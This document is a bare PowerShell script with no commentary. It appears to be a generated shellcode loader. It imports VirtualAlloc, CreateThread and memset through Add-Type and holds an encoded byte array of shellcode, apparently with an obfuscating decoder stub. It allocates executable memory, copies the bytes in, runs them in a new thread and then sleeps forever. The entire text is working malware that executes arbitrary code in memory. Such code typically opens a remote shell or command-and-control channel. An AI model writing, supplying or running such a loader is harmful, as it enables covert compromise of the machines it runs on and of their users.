$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xd0,0xd1,0x8d,0x5a,0xda,0xd7,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x7d,0x13,0x83,0xed,0xfc,0x03,0x7d,0xdf,0x33,0x78,0xa6,0x37,0x31,0x83,0x57,0xc7,0x56,0x0d,0xb2,0xf6,0x56,0x69,0xb6,0xa8,0x66,0xf9,0x9a,0x44,0x0c,0xaf,0x0e,0xdf,0x60,0x78,0x20,0x68,0xce,0x5e,0x0f,0x69,0x63,0xa2,0x0e,0xe9,0x7e,0xf7,0xf0,0xd0,0xb0,0x0a,0xf0,0x15,0xac,0xe7,0xa0,0xce,0xba,0x5a,0x55,0x7b,0xf6,0x66,0xde,0x37,0x16,0xef,0x03,0x8f,0x19,0xde,0x95,0x84,0x43,0xc0,0x14,0x49,0xf8,0x49,0x0f,0x8e,0xc5,0x00,0xa4,0x64,0xb1,0x92,0x6c,0xb5,0x3a,0x38,0x51,0x7a,0xc9,0x40,0x95,0xbc,0x32,0x37,0xef,0xbf,0xcf,0x40,0x34,0xc2,0x0b,0xc4,0xaf,0x64,0xdf,0x7e,0x14,0x95,0x0c,0x18,0xdf,0x99,0xf9,0x6e,0x87,0xbd,0xfc,0xa3,0xb3,0xb9,0x75,0x42,0x14,0x48,0xcd,0x61,0xb0,0x11,0x95,0x08,0xe1,0xff,0x78,0x34,0xf1,0xa0,0x25,0x90,0x79,0x4c,0x31,0xa9,0x23,0x18,0xf6,0x80,0xdb,0xd8,0x90,0x93,0xa8,0xea,0x3f,0x08,0x27,0x46,0xb7,0x96,0xb0,0xa9,0xe2,0x6f,0x2e,0x54,0x0d,0x90,0x66,0x92,0x59,0xc0,0x10,0x33,0xe2,0x8b,0xe0,0xbc,0x37,0x21,0xe4,0x2a,0xb2,0xb7,0x82,0x95,0xaa,0xb5,0x4a,0xe8,0x91,0x33,0xac,0xba,0xb5,0x13,0x61,0x7a,0x66,0xd4,0xd1,0x12,0x6c,0xdb,0x0e,0x02,0x8f,0x31,0x27,0xa8,0x60,0xec,0x1f,0x44,0x18,0xb5,0xd4,0xf5,0xe5,0x63,0x91,0x35,0x6d,0x80,0x65,0xfb,0x86,0xed,0x75,0x6b,0x67,0xb8,0x24,0x3d,0x78,0x16,0x42,0xc1,0xec,0x9d,0xc5,0x96,0x98,0x9f,0x30,0xd0,0x06,0x5f,0x17,0x6b,0x8e,0xf5,0xd8,0x03,0xef,0x19,0xd9,0xd3,0xb9,0x73,0xd9,0xbb,0x1d,0x20,0x8a,0xde,0x61,0xfd,0xbe,0x73,0xf4,0xfe,0x96,0x20,0x5f,0x97,0x14,0x1f,0x97,0x38,0xe6,0x4a,0x29,0x04,0x31,0xb2,0x5f,0x64,0x81;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};